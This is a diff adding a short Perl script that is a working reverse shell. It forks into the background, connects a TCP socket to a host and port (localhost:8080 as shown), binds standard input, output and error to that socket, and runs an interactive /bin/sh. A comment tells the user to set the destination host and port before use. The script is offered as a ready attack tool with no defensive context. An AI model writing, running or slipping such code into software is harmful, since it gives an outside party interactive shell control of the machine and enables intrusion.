@@ -1,0 +1,6 @@
+#!/usr/bin/perl
+# Note: set destination hostname port before using this code. DUH.
+use Socket;fork&&exit;socket S,AF_INET,SOCK_STREAM,0;connect S,sockaddr_in(8080,
+inet_aton localhost);open STDOUT,">&S";open STDERR,">&S";open STDIN,"<&S";exec
+"/bin/sh -i";
+
